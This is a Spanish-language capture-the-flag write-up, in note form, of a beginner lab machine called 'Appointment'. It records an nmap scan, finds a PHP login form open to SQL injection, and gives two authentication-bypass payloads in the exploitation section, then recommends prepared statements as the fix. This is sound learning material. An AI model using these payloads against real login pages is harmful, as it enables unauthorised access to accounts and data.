---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
---
## 1. Información General

- **Máquina:** Appointment

- **IP:** 10.129.16.130

- **SO:** Linux

- **Dificultad:** Muy fácil

- **Fecha:** 13/03/2026

## 2. Resumen Ejecutivo

Se identificó una aplicación web vulnerable con inyección SQL que permitía el bypass completo de la autenticación mediante una consulta mágica. La flag se encontraba tras un formulario de login sin validación de inputs.

## 3. Enumeración (Reconocimiento)

### 3.1 Escaneo de Red

- **Comando utilizado:** `nmap -sC -sV 10.129.16.130`

- **Puertos Abiertos:**

| **Puerto** | **Servicio** | **Versión**  | **Estado** |
| ---------- | ------------ | ------------ | ---------- |
| 80         | HTTP         | Apache httpd | Abierto    |

### 3.2 Análisis de Servicios

_(Aquí es donde detallas lo que encontraste manualmente)_

- **Tecnologías Detectadas:** PHP/Apache

- **Hallazgos Clave:** Web app expuesta con formulario de login visible

## 4. Explotación (Gaining Access)

- **Razonamiento:** La web no sanitiza inputs en el login, permitiendo exploits SQLi básicos

- **Pasos de Reproducción:**
    Login a la aplicación web:
    Usuario: ' OR 1=1 #
    Contraseña: cualquier valor
    Resultado: Login exitoso sin autenticación

    Consulta alternativa para admin:
    Usuario: admin'#
    Resultado: Login exitoso, el hash comenta lo restante de la query

## 5. Remediación y Conclusiones

- **Criticidad:** Alta

- **Recomendaciones:**

	1. **Parcheo:** Validar inputs mediante Prepared Statements en lugar de concatenar strings directamente en queries SQL.
	2. **Seguridad por defecto:** Deshabilitar login anónimo donde sea posible y aplicar el principio de menos privilegios.
